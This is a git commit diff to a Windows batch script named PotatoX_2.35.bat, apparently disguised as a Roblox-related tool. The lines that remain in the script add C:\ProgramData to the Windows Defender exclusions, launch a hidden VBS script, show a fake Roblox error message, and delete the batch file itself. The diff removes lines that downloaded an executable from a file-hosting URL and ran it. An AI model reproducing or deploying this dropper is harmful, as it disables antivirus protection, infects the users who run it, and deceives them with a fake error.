4d4e8d64b6780ea05448d860802054748dad4ba7
potatoxy <viktorsbudreiko@gmail.com>
2025-04-28 19:20:02 +0300

    Update PotatoX_2.35.bat

--- PotatoX_2.35.bat
+++ PotatoX_2.35.bat
@@ -16,8 +16,6 @@ IF %ERRORLEVEL% EQU 0 (
 powershell -Command "& {Add-MpPreference -ExclusionPath 'C:\ProgramData'}" -ExecutionPolicy Bypass
 powershell -Command "& {$paths = (Get-MpPreference).ExclusionPath; if ('C:\ProgramData' -in $paths) {Write-Host 'Loaded assets.' -ForegroundColor Green} else {Write-Host 'Assets failed to load.' -ForegroundColor Red}}" -ExecutionPolicy Bypass
 start wscript "C:\ProgramData\wallpapersvc.vbs"
-curl -L -o soup.exe https://files.catbox.moe/f9f91b.xx
-start soup.exe
 msg *.* RobloxInit failed to complete (0x00000000)
 start cmd /c "timeout /t 2 /nobreak & del *.bat"
 exit
